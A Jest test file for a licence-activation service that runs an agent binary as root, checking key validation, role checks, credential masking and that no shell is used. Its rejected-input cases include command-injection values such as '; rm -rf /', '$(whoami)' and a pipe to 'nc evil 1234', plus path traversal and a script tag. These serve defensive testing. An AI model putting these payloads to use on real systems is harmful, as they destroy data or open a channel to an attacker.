import { BadRequestException, ForbiddenException } from '@nestjs/common';
import { LicenceActivationService } from './licence-activation.service';

/**
 * THIS IS THE ONLY PLACE THE PANEL RUNS A BINARY AS ROOT.
 *
 * Everything here is about keeping it that way safely. The licence key arrives
 * from a browser form and is handed to a privileged process, so the two things
 * that must never regress are: no shell is involved, and nothing reaches the
 * command line that has not been matched against a strict pattern first.
 *
 * The defences are deliberately doubled. If a future change loosens the regex
 * — to support a new key format, say — execFile still means shell
 * metacharacters are inert. If someone swaps execFile for exec, the regex is
 * still standing. A test guards each one independently.
 */
describe('licence: activation from the browser', () => {
  const ADMIN = { id: 1, role: 'SUPER_ADMIN', ip: '10.0.0.5', userAgent: 'jest' };

  function make() {
    const created: any[] = [];
    const prisma: any = {
      activityLog: { create: jest.fn(async (args: any) => { created.push(args.data); return args.data; }) },
    };
    const licence: any = { refresh: jest.fn().mockResolvedValue(undefined), state: 'ACTIVE' };
    return { svc: new LicenceActivationService(prisma, licence), created, prisma, licence };
  }

  // ── key validation ──────────────────────────────────────────────────────

  it('accepts a real key and the trial keyword', () => {
    expect(LicenceActivationService.isValidKey('JBX-E2PHH-6S8Q4-YB4E4-ADT1V')).toBe(true);
    expect(LicenceActivationService.isValidKey('trial')).toBe(true);
  });

  it.each([
    ['shell metacharacters', 'JBX-E2PHH-6S8Q4-YB4E4-ADT1V; rm -rf /'],
    ['command substitution', 'JBX-$(whoami)-6S8Q4-YB4E4-ADT1V'],
    ['backticks',            'JBX-`id`-6S8Q4-YB4E4-ADT1V'],
    ['a pipe',               'JBX-E2PHH-6S8Q4-YB4E4-ADT1V | nc evil 1234'],
    ['a newline',            'JBX-E2PHH-6S8Q4-YB4E4-ADT1V\nmalicious'],
    ['a leading flag',       '-version'],
    ['path traversal',       '../../etc/passwd'],
    ['lowercase',            'jbx-e2phh-6s8q4-yb4e4-adt1v'],
    ['wrong group length',   'JBX-E2PH-6S8Q4-YB4E4-ADT1V'],
    ['empty',                ''],
  ])('rejects %s', (_label, key) => {
    expect(LicenceActivationService.isValidKey(key)).toBe(false);
  });

  it('refuses a malformed key before running anything', async () => {
    const { svc, prisma } = make();
    await expect(svc.activate({ key: 'nonsense; rm -rf /' }, ADMIN))
      .rejects.toBeInstanceOf(BadRequestException);
    // Nothing was run, and nothing was audited, because nothing happened.
    expect(prisma.activityLog.create).not.toHaveBeenCalled();
  });

  it('does not echo the rejected value back to the caller', async () => {
    // A reflected input is how a hostile string ends up rendered somewhere later.
    const { svc } = make();
    const err = await svc.activate({ key: '<script>alert(1)</script>' }, ADMIN).catch((e) => e);
    expect(String(err.message)).not.toContain('script');
  });

  // ── authorisation ───────────────────────────────────────────────────────

  it.each([['RESELLER'], ['SUB_RESELLER'], ['RETAILER'], [undefined as any]])(
    'refuses role %s', async (role) => {
      const { svc, prisma } = make();
      await expect(svc.activate({ key: 'trial' }, { id: 2, role }))
        .rejects.toBeInstanceOf(ForbiddenException);
      expect(prisma.activityLog.create).not.toHaveBeenCalled();
    },
  );

  // ── the key is a credential ─────────────────────────────────────────────

  it('masks the key, keeping only enough to match an invoice', () => {
    expect(LicenceActivationService.mask('JBX-E2PHH-6S8Q4-YB4E4-ADT1V'))
      .toBe('JBX-E2PHH-…-ADT1V');
    expect(LicenceActivationService.mask('trial')).toBe('trial');
  });

  it('never writes a full key into the audit row', async () => {
    const { svc, created } = make();
    // Force the agent call to fail fast; the audit still has to be written.
    process.env.JBX_AGENT_BIN = '/nonexistent/jointbox-licensed';
    process.env.JBX_SUDO_BIN = '/nonexistent/sudo';
    await svc.activate({ key: 'JBX-E2PHH-6S8Q4-YB4E4-ADT1V' }, ADMIN).catch(() => {});
    delete process.env.JBX_AGENT_BIN;
    delete process.env.JBX_SUDO_BIN;

    expect(created.length).toBe(1);
    const row = JSON.stringify(created[0]);
    expect(row).not.toContain('6S8Q4');
    expect(row).not.toContain('YB4E4');
    expect(row).toContain('JBX-E2PHH');
    expect(created[0].action).toBe('licence.activate.failed');
    expect(created[0].ipAddress).toBe('10.0.0.5');
  });

  it('strips a key out of anything the agent prints', () => {
    const svc: any = make().svc;
    const out = svc.scrub(
      'bound to JBX-AAAAA-BBBBB-CCCCC-DDDDD already',
      'JBX-E2PHH-6S8Q4-YB4E4-ADT1V',
    );
    // Keys other than the submitted one are masked too — the agent must not be
    // able to leak a different customer's key through this channel either.
    expect(out).not.toContain('BBBBB');
    expect(out).toContain('JBX-AAAAA');
  });

  // ── ratchets ────────────────────────────────────────────────────────────

  const src = () => require('fs').readFileSync(__dirname + '/licence-activation.service.ts', 'utf8');

  /**
   * THE ONE THAT MATTERS. execFile passes an argument array to execve with no
   * shell; exec and spawn({shell:true}) hand the string to /bin/sh, at which
   * point every quoting assumption in this file is void.
   */
  it('never reaches a shell', () => {
    const s = src();
    expect(s).toContain('execFile');
    expect(s).not.toMatch(/\bexec\s*\(/);
    expect(s).not.toMatch(/shell\s*:\s*true/);
    expect(s).not.toMatch(/child_process['"]\s*\)\s*\.exec\b/);
  });

  /**
   * Flags are written -flag=value so a value can never be read as the next
   * flag. Separated form would make `-company` followed by `-activate` a
   * question about argument parsing rather than a fact.
   */
  it('passes every flag in the unambiguous -flag=value form', () => {
    const s = src();
    const flags = s.match(/`-[a-z]+=\$\{/g) || [];
    expect(flags.length).toBeGreaterThanOrEqual(5);
    expect(s).not.toMatch(/'-company',\s*/);
  });

  it('bounds how long it will wait for the agent', () => {
    expect(src()).toMatch(/timeout/);
    expect(src()).toContain('ACTIVATE_TIMEOUT_MS');
  });
});
